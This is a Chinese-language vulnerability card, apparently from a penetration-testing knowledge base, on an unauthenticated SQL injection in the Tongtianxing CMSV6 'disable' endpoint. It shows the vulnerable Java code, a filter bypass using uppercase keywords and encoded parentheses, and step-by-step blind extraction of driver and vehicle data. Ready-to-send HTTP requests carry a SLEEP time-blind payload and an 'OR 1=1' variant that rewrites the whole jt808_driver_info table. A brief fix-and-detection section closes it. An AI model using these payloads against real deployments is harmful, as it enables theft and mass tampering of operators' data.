---
id: web-generic-sqli-cmsv6-edu-security-officer-disable-ids
title: 通天星 CMSV6 edu_security_officer/disable 的 ids 直拼 UPDATE ... IN：大写 SLEEP 与 %28 编码绕过 SQL 过滤器的时间盲注
type: scenario
domain: web
path: web/generic/sqli
technique: native-sql-update-in-clause-injection-filter-bypass
tags:
- cmsv6
- java
- spring-mvc
- sqli
- time-blind
- filter-bypass
- mysql
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T09:02:46+08:00'
  notes: 已对照原文与全部18张图核对：EduSecurityOfficerDao#disable的UPDATE jt808_driver_info SET disable=1 WHERE ID in (ids)直拼（图15）、disable;downloadLogger.action矩阵参数路径、ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29的PoC与5014ms响应均与原文一致。数据篡改变体为卡内补充的授权测试建议。未验证点：未实际请求。
url: /docs/web/generic/sqli/web-generic-sqli-cmsv6-edu-security-officer-disable-ids/
draft: false
kb_aliases:
- 通天星 CMSV6 disable SQL 注入
- EduSecurityOfficerDao 注入
- jt808_driver_info 注入
- disable;downloadLogger.action
- CMSV6 时间盲注
---

## 一句话结论

`EduSecurityOfficerDao#disable` 把 `ids` 直接拼进 `UPDATE jt808_driver_info SET disable = 1 WHERE ID in (" + ids + ")` 并交给 `execNativeSql` 执行，过滤器黑名单区分大小写且拦不住 URL 编码的括号，用 `ids=1 AND (SELECT ... SLEEP(5) ...)` 即可确认时间盲注；同一注入点还能改写 UPDATE 条件批量篡改数据。

## 原理

- 入口是 Spring MVC 的 `edu_security_officer/disable;downloadLogger.action`。`;` 是矩阵参数分隔符，Servlet/Spring 在路由匹配时会去掉 `;` 之后的内容，但仍把请求交给对应 controller；因此该路径既保住了 `disable` 动作的路由，又可能让只按后缀/路径匹配的过滤器漏判（文章用该写法构造请求）。
- `com.gps808...EduSecurityOfficerDao#disable(String ids)` 的代码为：

  ```java
  public void disable(String ids) throws Exception {
      String sql = "UPDATE jt808_driver_info SET disable = 1 WHERE ID in (" + ids + ")";
      this.paginationDao.execNativeSql(sql);
  }
  ```

  同理 `dismissDisable` 也是 `SET disable = 0 WHERE ID in (" + ids + ")`。`ids` 完全由请求参数控制，未做数字/逗号白名单，`execNativeSql` 直接把拼接结果交给数据库执行。
- 注入位置在 `IN (...)` 的值列表里，因此不能用 UNION 回显；但可以构造布尔表达式、时间函数和子查询。文章 PoC：

  ```
  ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29
  ```

  URL 解码后为 `1 AND (SELECT 2688 FROM (SELECT(SLEEP(5)))kOIi)`。MySQL 在 `IN (1 AND (子查询))` 中会对每行求值 `SLEEP(5)`，响应被延迟约 5 秒（截图实测 5014ms），据此可做时间盲注逐位取数据。
- 过滤器绕过：`XssSqlFilter` 的旧实现用 `String.contains` 逐条匹配，黑名单里是 `sleep(`、`select `（小写且带尾随空格）等字面量；`contains` 区分大小写，所以 `SLEEP`、`SELECT` 大写不会被命中。括号 `()`、`) (` 也在黑名单中，PoC 用 `%28`/`%29` 编码括号，配合 `+` 代替空格，使原始参数串不出现黑名单子串。若目标启用了大小写不敏感的正则版过滤器，需换用其他函数/语法或改打布尔盲注。
- 由于语句本身是 UPDATE，注入不仅能读数据：把 `ids` 改成 `1) OR 1=1 -- ` 之类的条件可让 `WHERE ID in (...)` 恒真，从而把 `jt808_driver_info` 全表 `disable` 置 1（或经 `dismissDisable` 置 0），这是区别于 SELECT 注入的直接数据篡改危害。

## 触发条件

- 目标暴露 `edu_security_officer/disable`（或同 DAO 的其他调用入口），文章 PoC 未携带登录 Cookie，属于前台可达。
- 数据库为 MySQL（`SLEEP()`、子查询语法成立），且 `execNativeSql` 未限制语句类型/超时。
- 过滤器为区分大小写的 `contains` 旧版，或至少未覆盖大写关键字与编码括号。
- `jt808_driver_info` 表存在（CMSV6 业务表），`ids` 能进入 SQL。

## 利用步骤

1. 先发 `ids=1` 观察正常响应时间，再发 `ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29`，对比 5 秒级延迟确认时间盲注；若延迟不明显，尝试 `SLEEP(3)`、`BENCHMARK()` 或布尔条件。
2. 用时间盲注逐位取库名、表名、列名与数据，或直接围绕业务表（司机/车辆信息）读取敏感字段。
3. 验证数据篡改：用 `ids=1) OR 1=1 -- ` 把 UPDATE 的 `IN` 条件闭合为恒真，观察全表 `disable` 状态变化；实战中应避免破坏性验证，先备份/在测试环境确认。
4. 若 DELETE/UPDATE 堆叠被驱动支持（`execNativeSql` 配置允许），还可进一步执行其他语句；不确定时按单语句处理。

## PoC

```http
GET /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29 HTTP/1.1
Host: 192.168.52.130
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Connection: close
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip, deflate
```

预期响应延迟约 5 秒（文章截图 5014ms）。把 `SLEEP(5)` 换成 `SLEEP(0)` 作为对照，确认延迟来自注入而非网络抖动。

数据篡改变体（仅在授权测试环境使用）：

```http
GET /edu_security_officer/disable;downloadLogger.action?ids=1%29+OR+1%3D1+--+ HTTP/1.1
```

URL 解码后 `ids=1) OR 1=1 -- `，使 `WHERE ID in (1) OR 1=1` 恒真。

## 变体与关联

- 同一产品的 `/point_manage/merge` 也是拼接 SQL，但注入点是 SELECT 的 `name`，见 `web/generic/sqli` 下 CMSV6 point_manage 卡；两处共用「大写关键字 + URL 编码括号/换行」绕过同一套 `XssSqlFilter` 的思路。
- `dismissDisable(String ids)` 与 `disable` 代码结构完全相同，只是 `SET disable = 0`，同样可注入，属于同一 sink 家族的第二个入口。
- 通用手法：`IN (...)` 列表注入通常不能 UNION，优先时间/布尔盲注；UPDATE 型注入还要考虑批量数据篡改。

## 检测与防御

- 修复：`ids` 按逗号拆分为整数数组，用 `PreparedStatement` 的 `IN (?,?,...)` 绑定；禁止字符串拼接；对数量与取值范围做校验。
- 过滤器：`XssSqlFilter` 黑名单改为大小写不敏感、覆盖编码后的括号与换行，但只能作为纵深防御，不能替代参数化。
- 数据库：应用账号最小权限，禁止非必要 UPDATE 全表；设置查询超时与慢查询告警。
- 检测：监控 `ids` 参数中出现 `SLEEP`/`BENCHMARK`/`SELECT`/`OR 1=1`/编码括号的请求；对 `disable` 接口的响应时间异常（5 秒级）和批量状态变更告警；审计 `jt808_driver_info` 的批量 UPDATE。
- 排查：核对数据库中 `disable` 字段的异常批量变更时间点与 Web 访问日志中的 `ids` 参数。
